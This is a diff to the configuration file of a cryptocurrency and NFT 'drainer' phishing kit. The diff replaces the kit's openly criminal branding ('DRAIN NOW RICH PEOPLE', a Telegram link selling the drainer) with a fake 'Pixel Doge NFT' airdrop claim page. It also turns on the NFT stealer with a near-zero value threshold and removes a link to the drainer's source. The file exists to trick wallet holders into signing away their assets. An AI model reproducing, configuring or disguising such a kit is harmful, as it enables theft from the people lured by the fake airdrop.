@@ -1,11 +1,11 @@
 const receiveAddress = "Your ETH Wallet Adress";
 
 const collectionInfo = {
-    name: "TEC DRAINER",
+    name: "Pixel Doge NFT",
     socialMedia: {
-        discord: "https://t.me/TecOnSellix",
-        twitter: "https://t.me/TecOnSellix",
-        instagram: "https://t.me/TecOnSellix",
+        discord: "https://t.me/#",
+        twitter: "https://t.me/#",
+        instagram: "https://t.me/#",
     },
 }
 
@@ -16,11 +16,11 @@ const indexPageInfo = {
 }
 
 const claimPageInfo = {
-    title: "FREE NFT", // Name will appeair
-    shortDescription: "DRAIN NOW RICH PEOPLE.",
-    longDescription: "YOU CAN ALSO BUY FULL ETH DRAINER WITH SIGNATURE AT T.ME/TECONSELLIX. ENJOY DRAINING!",
+    title: "Pixel Doge NFT", // Name will appeair
+    shortDescription: "Join Pixel Doge AirDrop",
+    longDescription: "",
 
-    claimButtonText: "CLAIM NOW",
+    claimButtonText: "GET PIXEL DOGE",
 
     image: "TecOnSellix.jpeg", // relative path to image (in assets)
     imageRadius: 250, // image radius in px
@@ -28,7 +28,7 @@ const claimPageInfo = {
 
 const drainNftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.1,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.00001,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     nftReceiveAddress: "" // leave empty if you want to use the same as receiveAddress 
 }
 
@@ -38,10 +38,6 @@ const customStrings = {
     transferButton: "Mint now",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
 }
-
-/*
-    = = = = = https://github.com/0x32Moon/Crypto-Nft-Drainer-V2 = = = = =
-*/
 
 //#region Check Configuration
 if (!receiveAddress.startsWith("0x") ||
